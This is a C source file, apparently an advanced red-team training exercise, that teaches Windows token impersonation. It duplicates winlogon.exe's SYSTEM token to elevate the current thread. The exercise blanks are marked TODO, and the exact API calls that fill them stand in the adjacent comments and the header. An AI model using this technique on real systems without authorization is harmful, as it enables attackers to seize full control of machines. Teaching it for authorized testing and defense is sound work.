// CFarer - Red Team Exercise 05
// TOPIC: Token Impersonation - steal and use another process's token
// DIFFICULTY: Advanced  PLATFORM: Windows
// PURPOSE: Authorized penetration testing education - privilege escalation
//
// Windows access tokens represent security context.  A SYSTEM process token
// can be stolen and used to elevate to SYSTEM without exploiting a bug -
// just abusing the legitimate token duplication API.
//
// Steps:
//   1. Enable SeDebugPrivilege (needed to open high-privilege processes).
//   2. Find a SYSTEM process (e.g., winlogon.exe, services.exe).
//   3. OpenProcess(PROCESS_QUERY_INFORMATION, ..., pid).
//   4. OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken).
//   5. DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
//        SecurityImpersonation, TokenImpersonation, &hDupToken).
//   6. ImpersonateLoggedOnUser(hDupToken) - current thread now runs as SYSTEM.
//   7. Verify: GetUserNameA() should return "SYSTEM".
//   8. RevertToSelf() - drop impersonation.
//
// REQUIRES: SeDebugPrivilege / admin.

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

static BOOL enable_debug_privilege(void) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    LUID luid;
    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);
    TOKEN_PRIVILEGES tp = {1, {{ luid, SE_PRIVILEGE_ENABLED }}};
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return (GetLastError() == ERROR_SUCCESS);
}

static DWORD find_process(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(snap, &pe))
        do { if (_stricmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; } }
        while (Process32Next(snap, &pe));
    CloseHandle(snap);
    return pid;
}

int main(void) {
    enable_debug_privilege();

    char username[128]; DWORD ulen = sizeof(username);
    GetUserNameA(username, &ulen);
    printf("Before: %s\n", username);

    // TODO 1: find winlogon.exe PID
    DWORD pid = 0; // replace: pid = find_process("winlogon.exe");
    if (!pid) { fprintf(stderr, "winlogon not found\n"); return 1; }
    printf("winlogon PID: %lu\n", pid);

    // TODO 2: OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid)
    HANDLE hProc = NULL; // replace
    if (!hProc) { fprintf(stderr, "OpenProcess: %lu\n", GetLastError()); return 1; }

    // TODO 3: OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken)
    HANDLE hToken = NULL;
    // OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken);
    CloseHandle(hProc);

    // TODO 4: DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
    //           SecurityImpersonation, TokenImpersonation, &hDupToken)
    HANDLE hDupToken = NULL;
    // DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
    //                  SecurityImpersonation, TokenImpersonation, &hDupToken);
    CloseHandle(hToken);

    // TODO 5: ImpersonateLoggedOnUser(hDupToken)
    // ImpersonateLoggedOnUser(hDupToken);

    ulen = sizeof(username);
    GetUserNameA(username, &ulen);
    printf("After impersonation: %s\n", username);

    // TODO 6: RevertToSelf()
    // RevertToSelf();
    ulen = sizeof(username);
    GetUserNameA(username, &ulen);
    printf("After revert: %s\n", username);

    if (hDupToken) CloseHandle(hDupToken);
    return 0;
}

// LOOKAHEAD: rt06 and rt09 use COM, which no earlier exercise has taught.
// Complete rt06a_com_basics first - it covers COM init + object creation.

// I AM NOT DONE
